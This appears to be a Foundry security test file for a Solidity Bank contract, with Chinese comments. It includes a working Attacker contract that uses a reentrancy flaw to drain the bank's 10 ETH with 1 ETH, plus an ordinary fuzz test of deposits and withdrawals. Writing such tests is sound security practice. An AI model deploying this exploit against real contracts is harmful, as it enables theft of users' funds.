// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../../src/bank/Bank.sol";

/**
 * @notice 恶意攻击合约
 * @dev 模拟黑客行为, 利用重入漏洞攻击银行合约
 */
contract Attacker {
    Bank public bank;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
    }

    // 攻击入口
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        // 1. 先存入一点钱作为诱饵
        bank.deposit{value: msg.value}();
        // 2. 立即取款, 触发重入
        bank.withdraw(msg.value);
    }

    // 回调函数: 当收到 ETH 时自动被触发
    receive() external payable {
        // 关键: 如果银行还有钱, 就再次调用 withdraw (递归/重入)
        // 每次取款金额等于初始投入金额
        if (address(bank).balance >= msg.value) {
            bank.withdraw(msg.value);
        }
    }
}

/**
 * @title Bank合约安全性测试集 (Security Test)
 * @notice 包含重入攻击演示和模糊测试
 * @dev
 * 包含:
 * 1. test_ReentrancyAttack: 重入攻击演示 (漏洞利用)
 * 2. testFuzz_DepositWithdraw: 模糊测试 (随机参数)
 *
 * 运行命令: forge test --match-contract BankSecurityTest
 */
contract BankSecurityTest is Test {
    Bank public bank;
    Attacker public attacker;

    function setUp() public {
        bank = new Bank();
        attacker = new Attacker(address(bank));

        // 初始状态: 给银行预存 10 ETH (模拟无辜用户的存款)
        // 这些钱将被攻击者盗走
        vm.deal(address(this), 10 ether);
        bank.deposit{value: 10 ether}();
    }

    /**
     * 测试重入攻击 (Reentrancy Attack)
     *
     * 场景: 攻击者利用 1 ETH 盗空银行里的 10 ETH
     */
    function test_ReentrancyAttack() public {
        console.log(unicode"=== 攻击开始 ===");
        console.log(unicode"Bank 初始余额:", address(bank).balance / 1 ether, "ETH");

        // 1. 给攻击者准备 1 ETH 本金
        vm.deal(address(attacker), 1 ether);

        // 2. 攻击者发起攻击
        // pranking: 模拟下一次调用是由 attacker 发起的
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        console.log(unicode"=== 攻击结束 ===");
        console.log(unicode"Bank 剩余余额:", address(bank).balance / 1 ether, "ETH");
        console.log(unicode"攻击者最终余额:", address(attacker).balance / 1 ether, "ETH");

        // 验证: 银行被掏空 (余额 < 初始存款)
        assertLt(address(bank).balance, 10 ether);
        // 验证: 攻击者获利 (余额 > 初始本金)
        assertGt(address(attacker).balance, 1 ether);
    }

    /**
     * 模糊测试 (Stateless Fuzzing)
     *
     * 原理: Foundry 自动生成数千个随机 amount 值进行测试
     * 目标: 确保常规存取款功能在各种金额下都能正常工作
     */
    function testFuzz_DepositWithdraw(uint96 amount) public {
        // 限制: 过滤掉金额为0的情况 (假设业务不接受0)
        vm.assume(amount > 0);
        // 限制: 避免金额过大溢出 (虽然 Bank 没限制, 但测试环境有限制)
        vm.assume(amount < 1000 ether);

        // 使用一个全新的随机用户进行测试，避免 setUp 中的状态干扰
        address fuzzUser = address(0x123456);
        vm.deal(fuzzUser, amount);

        // 模拟该用户操作
        vm.startPrank(fuzzUser);

        // 测试存钱
        bank.deposit{value: amount}();
        assertEq(bank.balances(fuzzUser), amount);

        // 测试取钱
        bank.withdraw(amount);
        assertEq(bank.balances(fuzzUser), 0);

        vm.stopPrank();
    }
}
